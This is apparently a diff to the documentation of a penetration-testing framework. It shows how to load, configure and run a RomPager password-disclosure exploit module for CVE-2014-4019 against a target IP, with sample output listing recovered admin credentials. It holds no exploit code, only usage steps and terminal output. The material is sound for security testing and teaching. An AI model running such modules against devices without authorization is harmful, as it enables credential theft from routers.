@@ -15,26 +15,35 @@ Modules can be different. They can scan the target for opened ports, exploit sec
 
 To use specific module, just type `use` and module name.
 
-```
-[hsf]> use
-Usage: use <module|number>
-[hsf]>
+```hsf
+[hsf3]> use exploit/linux/rompager/multi_password_disclosure
+[hsf3: RomPager Multi Password Disclosure]> 
 ```
 
 **NOTE:** You can use the module by its number from `search` or `show` lists.
 
-```
-[hsf7]> use exploit/linux/rompager/multi_password_disclosure
-[hsf7: exploit: RomPager Multi Password Disclosure]> info
- 
-Category:    exploit
-Name:        RomPager Multi Password Disclosure
-Module:      exploit/linux/rompager/multi_password_disclosure
-Description: RomPager multiple devices password disclosure.
-Platform:    linux
-Rank:        high
+```hsf
+[hsf3: RomPager Multi Password Disclosure]> info
 
-[hsf7: exploit: RomPager Multi Password Disclosure]>
+    Name: RomPager Multi Password Disclosure
+  Module: exploit/linux/rompager/multi_password_disclosure
+Platform: linux
+    Rank: high
+
+Authors:
+  Ivan Nikolskiy (enty8080) - module developer
+
+Description:
+  Numerious devices using RomPager are vulnerable to
+  a password disclosure through extracting it from
+  the downloaded rom-0 file.
+
+References:
+  URL: https://github.com/EntySec/RomBuster
+  URL: https://nvd.nist.gov/vuln/detail/cve-2014-4019
+  URL: https://www.exploit-db.com/exploits/33803
+  CVE: 2014-4019
+  EDB: 33803
 ```
 
 Here we also used `info` command to obtain the general module information.
@@ -43,7 +52,7 @@ The module we just selected is an exploit for `RomPager 4.07` server. It takes f
 
 You can list module options using `options` command and list advanced options using `advanced` command.
 
-```
+```hsf
 [hsf7: exploit: RomPager Multi Password Disclosure]> options
  
 Module Options (exploit/linux/rompager/multi_password_disclosure):
@@ -55,21 +64,18 @@ Module Options (exploit/linux/rompager/multi_password_disclosure):
     ssl         no       no          Use SSL.
     timeout     10       no          Connection timeout.
     username    admin    yes         Default username.
- 
-[hsf7: exploit: RomPager Multi Password Disclosure]>
 ```
 
 Options can be set using `set` command and can be set to `None` using `unset`.
 
-```
+```hsf
 [hsf7: exploit: RomPager Multi Password Disclosure]> set host 192.168.1.56
 [i] host => 192.168.1.56
-[hsf7: exploit: RomPager Multi Password Disclosure]>
 ```
 
 Finally, to execute the module, you should use command `run`.
 
-```
+```hsf
 [hsf7: exploit: RomPager Multi Password Disclosure]> run
  
  
@@ -80,7 +86,6 @@ Credentials:
     admin       admin
  
 [+] Exploit module completed!
-[hsf7: exploit: RomPager Multi Password Disclosure]>
 ```
 
 **NOTE:** If you want to run module as a background job, use `run -j`.
